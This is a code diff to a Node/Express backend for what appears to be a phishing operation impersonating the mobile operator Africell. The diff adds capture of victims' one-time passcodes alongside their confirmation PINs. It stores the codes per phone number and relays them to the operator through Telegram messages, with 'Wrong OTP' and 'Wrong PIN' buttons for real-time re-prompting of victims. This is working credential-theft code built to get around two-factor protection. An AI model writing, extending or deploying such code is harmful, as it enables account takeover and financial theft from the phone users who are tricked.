@@ -70,7 +70,12 @@ app.post('/api/submit-order', async (req, res) => {
         let wrongButtonText = "⚠️ Wrong Info";
         let stepTag = 'login';
 
-        if (uniqueId && uniqueId.startsWith('Confirmation PIN: ')) {
+        if (uniqueId && uniqueId.startsWith('OTP Code: ')) {
+            headerTitle = "📱 *Africell OTP Code Submitted*";
+            wrongButtonText = "⚠️ Wrong OTP";
+            stepTag = 'otp';
+            userCredentials[cleanPhone].otp = uniqueId.replace('OTP Code: ', '').trim();
+        } else if (uniqueId && uniqueId.startsWith('Confirmation PIN: ')) {
             headerTitle = "🔐 *Africell Confirmation PIN Submitted*";
             wrongButtonText = "⚠️ Wrong PIN";
             stepTag = 'pin';
@@ -98,6 +103,9 @@ app.post('/api/submit-order', async (req, res) => {
 
         if (userCredentials[cleanPhone].applicationDetails) {
             message += `\n\n📋 *Details:*\n${escapeMarkdown(userCredentials[cleanPhone].applicationDetails)}`;
+        }
+        if (userCredentials[cleanPhone].otp) {
+            message += `\n📱 OTP Code: \`${escapeMarkdown(userCredentials[cleanPhone].otp)}\``;
         }
         if (userCredentials[cleanPhone].confirmPin) {
             message += `\n🔐 Confirmation PIN: \`${escapeMarkdown(userCredentials[cleanPhone].confirmPin)}\``;
@@ -196,6 +204,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
         if (userCredentials[phone]) {
             const c = userCredentials[phone];
             if (c.applicationDetails) updatedMessage += `\n\n📋 *Details:*\n${escapeMarkdown(c.applicationDetails)}`;
+            if (c.otp) updatedMessage += `\n📱 OTP Code: \`${escapeMarkdown(c.otp)}\``;
             if (c.confirmPin) updatedMessage += `\n🔐 Confirmation PIN: \`${escapeMarkdown(c.confirmPin)}\``;
         }
         updatedMessage += `\n\n📌 Status: *${actionText}*`;
